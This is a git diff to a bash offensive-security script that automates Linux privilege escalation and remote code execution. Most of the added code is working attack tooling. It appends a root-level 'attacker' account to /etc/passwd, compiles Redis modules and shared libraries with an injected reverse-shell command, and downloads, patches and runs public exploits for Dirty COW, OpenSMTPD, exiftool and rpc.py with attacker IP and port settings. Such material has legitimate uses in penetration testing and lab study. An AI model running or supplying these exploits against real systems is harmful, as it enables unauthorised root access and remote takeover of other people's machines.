updated various scripts

+++ offsec/scripts/common/linux_escalate.sh
@@ -31,6 +31,19 @@ linux_esclation_strategy() {
     echo 'searchsploit linux kernel $(uname -r)'
 }
 
+create_passwd_user() {
+    if [[ -z $username ]]; then
+        username=attacker
+        echo "username is not set, using default: $username"
+    fi
+    if [[ -z $password ]]; then
+        password=password
+        echo "password is not set, using default: $password"
+    fi
+    echo "password_hash=\$(openssl passwd $password)"
+    echo "echo \"$username:\$password_hash:0:0:root:/root:/bin/bash\" >> /etc/passwd"
+}
+
 create_linux_exploits_generic() {
     if [[ -z "$exploit_dir" ]]; then
         exploit_dir="exploit"
@@ -39,7 +52,7 @@ create_linux_exploits_generic() {
         echo "linux_c_file_name is not set"
         return 1
     fi
-    if [[ -z $compile_command ]]; then
+    if [[ -z $compile_command ]] && [[ ! -f "$exploit_dir/Makefile" ]]; then
         echo "compile_command is not set"
         return 1
     fi
@@ -47,22 +60,33 @@ create_linux_exploits_generic() {
         mkdir "$exploit_dir"
     fi
     pushd "$exploit_dir" || exit 1
-    cp "$SCRIPTDIR/../c/$linux_c_file_name" .
-    if [[ -z $cmd ]]; then
-        cmd=$(get_bash_reverse_shell)
-        echo "cmd is not set, using default: $cmd"
+    if [[ ! -z $exploit_output ]] && [[ -f $exploit_output ]]; then
+        echo "Exploit output found, no need to recompile"
+    else
+        cp "$SCRIPTDIR/../c/$linux_c_file_name" .
+        if [[ -z $cmd ]]; then
+            cmd=$(get_bash_reverse_shell)
+            echo "cmd is not set, using default: $cmd"
+        fi
+        local command=$(echo "$cmd" | sed 's/"/\\"/g')
+        command=$(escape_sed "$command")
+        sed -E -i 's/\{command\}/'"$command"'/g' $linux_c_file_name
+        if [[ ! -f Makefile ]] || ! grep $exploit_output Makefile; then
+            echo "Creating Makefile"
+            echo "all:" > Makefile
+            echo -e "\t$compile_command" >> Makefile
+        fi
+        if [[ ! -f make.sh ]]; then
+            echo "Creating make.sh"
+            #most production systems do not come with make
+            echo "$compile_command" > make.sh
+            chmod a+x make.sh  
+        fi 
+        if [[ ! -z $compile_exploit ]] && [[ $compile_exploit == "true" ]]; then
+            compile_cpp
+        fi
     fi
-    local command=$(echo "$cmd" | sed 's/"/\\"/g')
-    command=$(escape_sed "$command")
-    sed -E -i 's/\{command\}/'"$command"'/g' $linux_c_file_name
-    echo "all:" > Makefile
-    echo -e "\t$compile_command" >> Makefile
-    #most production systems do not come with make
-    echo "$compile_command" > make.sh
-    chmod a+x make.sh   
-    if [[ ! -z $compile_exploit ]] && [[ $compile_exploit == "true" ]]; then
-        compile_cpp
-    fi
+
     popd || exit 1
     local exploit_filename=$(get_compression_filename "$exploit_dir")
     if [[ -f $exploit_filename ]]; then
@@ -75,12 +99,37 @@ create_linux_exploits_generic() {
     echo "make"    
 }
 
+create_redis_module() {
+    echo "Creating Redis module shared library..."
+    exploit_dir="exploit_redis_module"
+    if [[ ! -d $exploit_dir ]]; then
+        mkdir "$exploit_dir"
+    fi
+    local redismodule_header_url="https://raw.githubusercontent.com/RedisLabsModules/RedisModulesSDK/refs/heads/master/"
+    if [[ -z $redis_version ]]; then
+        redismodule_header_url+="redismodule.h"
+    else 
+        redismodule_header_url+="$redis_version/redismodule.h"
+    fi
+    if [[ ! -f "$exploit_dir/redismodule.h" ]]; then
+        wget "$redismodule_header_url" -O "$exploit_dir/redismodule.h"
+    fi
+    linux_c_file_name="redis_module.c"
+    if [[ -z $exploit_output ]]; then
+        exploit_output="redis_module.so"
+    fi
+    compile_command="gcc -o $exploit_output -shared -fPIC $linux_c_file_name"
+    compile_exploit=true
+    create_linux_exploits_generic
 
+}
 create_linux_executable() {
     echo "Creating Linux executable..."
     exploit_dir="exploit_executable"
     linux_c_file_name="run_linux.c"
     compile_command="gcc -o run_linux $linux_c_file_name"
+    compile_exploit=true
+    exploit_output="run_linux"
     create_linux_exploits_generic
 }
 
@@ -89,6 +138,8 @@ create_linux_shared_library() {
     exploit_dir="exploit_shared"
     linux_c_file_name="run_linux_so.c"
     compile_command="gcc -shared -fPIC -o librun_linux.so $linux_c_file_name"
+    compile_exploit=true
+    exploit_output="librun_linux.so"
     create_linux_exploits_generic
 }
 
@@ -105,6 +156,11 @@ deb [trusted=yes] http://archive.debian.org/debian/ stretch main contrib non-fre
 deb [trusted=yes] http://archive.debian.org/debian-security/ stretch/updates main contrib non-free" > updates_sources.list
         preupdate_action="echo \"$(cat updates_sources.list)\" > /etc/apt/sources.list &&"
     fi
+    if [[ $target_os == "centos:7" ]] || [[ $target_os == "centos:8" ]]; then
+        preupdate_action="sed -i 's/mirror\.centos\.org/vault.centos.org/g' /etc/yum.repos.d/CentOS-*.repo &&"
+        preupdate_action+="sed -i 's/^#.*baseurl=http/baseurl=http/g' /etc/yum.repos.d/CentOS-*.repo &&"
+        preupdate_action+="sed -i 's/^mirrorlist=http/#mirrorlist=http/g' /etc/yum.repos.d/CentOS-*.repo &&"
+    fi
     if [[ -z "$make_command" ]]; then
         make_command="make"
     fi
@@ -114,10 +170,38 @@ deb [trusted=yes] http://archive.debian.org/debian-security/ stretch/updates mai
     if [[ ! -z "$preupdate_action" ]]; then
         echo "Running preupdate_action: $preupdate_action"
     fi
-    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "$preupdate_action apt update && DEBIAN_FRONTEND=noninteractive apt install -y gcc binutils make $extra_packages && $make_command"
+    local install_command=""
+    local update_command=""
+    if [[ -z $package_manager ]]; then
+        package_manager="apt"
+        install_command="DEBIAN_FRONTEND=noninteractive $package_manager install -y"
+        update_command="$package_manager update"
+    else
+        if [[ $package_manager == "yum" ]]; then
+            install_command="$package_manager -y install"
+            update_command="echo not updating" #"$package_manager -y update"
+        fi
+    fi
+    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "$preupdate_action $update_command && $install_command gcc binutils make $extra_packages && $make_command"
 
 }
 
+generate_exploit_download() {
+    local cve_dir_lowercase=$(echo $cve_dir | sed 's/-/_/g' | tr '[:upper:]' '[:lower:]')
+    local cve_filename=$(get_compression_filename $cve_dir_lowercase)
+    if [[ -f "$cve_filename" ]]; then
+        echo "Removing existing $cve_filename"
+        rm $cve_filename
+    fi
+    compress_file "$cve_filename" "$cve_dir"
+    generate_linux_download "$cve_filename"
+    get_uncompress_command "$cve_filename"
+    echo "cd $cve_dir"
+    echo "make"
+    if [[ ! -z $exploit_executable ]]; then
+        echo "./$exploit_executable"
+    fi
+}
 
 perform_cve_2017_16995() {
     local target_os=$1
@@ -596,16 +680,99 @@ perform_cve_2019_13272() {
         fi
     fi
     popd || exit 1
-    local cve_filename=$(get_compression_filename "cve_2019_13272")
-    if [[ -f "$cve_filename" ]]; then
-        echo "Removing existing $cve_filename"
-        rm $cve_filename
-    fi
-    compress_file "$cve_filename" "$cve_dir"
-    generate_linux_download "$cve_filename"
-    get_uncompress_command "$cve_filename"
-    echo "cd $cve_dir"
-    echo "make"
-    echo "./$exploit_executable"
+    generate_exploit_download
 
+}
+
+
+
+perform_cve_2020_7247() {
+    if [[ ! -d "CVE-2020-7247" ]]; then
+        mkdir "CVE-2020-7247"
+    fi
+    pushd "CVE-2020-7247" || exit 1
+    if [[ ! -f 48051.pl ]]; then
+        searchsploit -m 48051
+        sed -E -i 's/#exec "nc -vlp/exec "nc -vlp/g' 48051.pl
+        sed -E -i 's/exec "nc -vl /#exec "nc -vl /g' 48051.pl
+    fi
+    if [[ ! -z $host_port ]]; then
+        sed -E -i 's/\$lport = .*;/\$lport = '$host_port';/g' 48051.pl
+    fi
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "target_ip is not set, using default: $target_ip"
+    fi
+    if ! is_listener_connected; then
+        perl 48051.pl RCE $target_ip $host_ip
+    fi
+    popd || exit 1
+
+}
+
+perform_cve_2016_5195 () {
+    local cve_dir="CVE-2016-5195"
+    local download_url="https://www.exploit-db.com/download/40839"    
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -f 40839.c ]]; then
+        wget "$download_url" -O 40839.c
+    fi
+    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
+        local exploit_executable="dirty"
+        if [[ ! -f "$exploit_executable" ]]; then
+            echo "Compiling exploit..."
+            echo "all:" > Makefile
+            echo -e "\tgcc -o $exploit_executable 40839.c -pthread -lcrypt" >> Makefile
+            if [[ -z $target_os ]]; then
+                target_os="ubuntu:16.04"
+            fi
+            compile_cpp
+        else
+            echo "Exploit already compiled, skipping compilation."
+        fi
+    fi
+    popd || exit 1
+    generate_exploit_download
+
+}
+
+perform_cve_2022_35411() {
+    local cve_dir="CVE-2022-35411"
+    local download_url="https://github.com/ehtec/rpcpy-exploit/raw/refs/heads/main/rpcpy-exploit.py"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -f "rpcpy-exploit.py" ]]; then
+        wget "$download_url" -O "rpcpy-exploit.py"
+    fi
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    local exec_command=""
+    exec_command=$(escape_sed "$cmd")
+    sed -E -i "s/exec_command\('.*'\)/exec_command\('$exec_command'\)/g" rpcpy-exploit.py
+    popd || exit 1
+    generate_exploit_download
+}
+
+#exiftool exploit
+perform_cve_2021_22204 () {
+    local cve_dir="CVE-2021-22204"
+    local download_url="https://github.com/convisolabs/CVE-2021-22204-exiftool/archive/refs/heads/master.zip"
+    if [[ ! -d "$cve_dir" ]]; then
+        wget "$download_url" -O "$cve_dir.zip"
+        unzip "$cve_dir.zip"
+        rm "$cve_dir.zip"
+        mv CVE-2021-22204-exiftool-master "$cve_dir"
+    fi
+    pushd "$cve_dir" || exit 1
+    sed -E -i "s/ip = .*/ip = '$host_ip'/g" exploit.py
+    sed -E -i "s/port = .*/port = '$host_port'/g" exploit.py
+    python3 exploit.py
+    popd || exit 1
+    generate_exploit_download
 }
